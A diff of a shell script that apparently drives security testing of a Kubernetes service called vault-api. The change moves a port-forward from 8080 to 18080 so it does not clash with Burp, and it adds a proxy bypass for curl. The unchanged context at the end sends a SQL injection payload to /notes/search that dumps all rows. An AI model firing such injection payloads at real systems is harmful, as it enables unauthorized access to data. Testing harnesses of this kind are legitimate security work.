@@ -5,10 +5,12 @@ set -u
 export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
 export PATH="$HOME/.local/bin:$PATH"
 
-kubectl -n vault port-forward svc/vault-api 8080:80 >/tmp/vault-pf.log 2>&1 &
+# Port 18080 avoids clashing with Burp (which owns 8080); --noproxy bypasses any proxy.
+kubectl -n vault port-forward svc/vault-api 18080:80 >/tmp/vault-pf.log 2>&1 &
 PF=$!; trap 'kill $PF 2>/dev/null' EXIT
 sleep 4
-B=http://127.0.0.1:8080
+B=http://127.0.0.1:18080
+curl() { command curl --noproxy '*' "$@"; }
 
 echo "== [SQLi] /notes/search  (returns all rows via injection) =="
 curl -s "$B/notes/search?q=x%27%20OR%20%271%27%3D%271" | head -c 400; echo; echo
